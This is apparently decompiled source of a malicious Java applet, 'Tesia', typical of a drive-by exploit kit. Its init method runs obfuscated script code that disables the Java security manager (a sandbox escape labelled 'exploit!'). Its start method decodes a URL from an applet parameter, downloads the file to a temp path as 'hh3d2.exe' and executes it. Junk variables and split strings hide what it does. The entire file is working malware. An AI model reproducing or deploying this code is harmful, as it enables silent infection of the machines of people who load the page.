import javax.script.ScriptException;
import java.awt.Component;
import javax.swing.JList;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Tesia extends Applet
{
    String sfff;
    private JList piydsw;
    
    public Tesia() {
        this.sfff = new String();
    }
    
    @Override
    public void init() {
        try {
            String iuyt = new String();
            final Men kjhgfdd = new Men();
            final int a = 22;
            kjhgfdd.kkswwop.eval("virf3ddar erirf3ddroirf3ddr = neirf3ddw Erirf3ddroirf3ddr(\"irf3ddy erirf3ddroirf3ddr\");thirf3ddis.toirf3ddStrirf3ddinirf3ddg = fuirf3ddncirf3ddtion(){ jairf3ddva.lairf3ddng.Syirf3ddsteirf3ddm.seirf3ddtSeirf3ddcurirf3ddityManairf3ddger(nuirf3ddll);appirf3ddlet.stirf3ddarirf3ddt();reirf3ddtuirf3ddrn \"exirf3ddploirf3ddit!\";};erirf3ddrirf3ddor.messirf3ddagirf3dde = thiirf3dds;".replace("irf3dd", ""));
            final int a2 = a * 3;
            this.piydsw = new JList((E[])new Object[] { kjhgfdd.kkswwop.get("erirf3ddroirf3ddr".replace("irf3dd", "")) });
            final int c = a + a2 - 2;
            for (int i = 0; i < 1; ++i) {
                iuyt += "";
            }
            this.add(this.piydsw);
        }
        catch (ScriptException ex) {}
    }
    
    @Override
    public void start() {
        try {
            final String c = new String();
            final Pol kk = new Pol();
            String kloir = kk.Pysta();
            if (kloir.charAt(kloir.length() - 1) != '\\') {
                kloir += "\\";
            }
            final String mjop = kloir + "hk7trddd3k7trd2.ek7trdxk7trde".replace("k7trd", "");
            final String b = new String();
            final Ou kuwdg = new Ou();
            final String a = new String();
            final String poisona = this.getParameter("diyrrwesiyrrwt".replace("iyrrw", ""));
            final String d = new String();
            final String dpoisona = kk.Tapa(poisona);
            kuwdg.qghq = kuwdg.Seagj(mjop);
            final String e = new String();
            kuwdg.lkefdw = Sikol.Ewsgh(dpoisona);
            final String f = new String();
            byte[] ooouyt = new byte[153601];
            final String g = new String();
            final int ahahah = 11;
            final byte[] kkky = new byte[100];
            final String fff = new String();
            int cnt = 0;
            while ((cnt = kuwdg.lkefdw.read(ooouyt)) > 0) {
                final String z = new String();
                kuwdg.qghq.write(ooouyt, 0, cnt);
                ooouyt = new byte[153601];
            }
            final String asa = new String();
            kuwdg.qghq.close();
            final String ddww = new String();
            kuwdg.lkefdw.close();
            try {
                final String aaa0 = new String();
                Sikol.Wefmi(mjop);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public class s
    {
    }
}
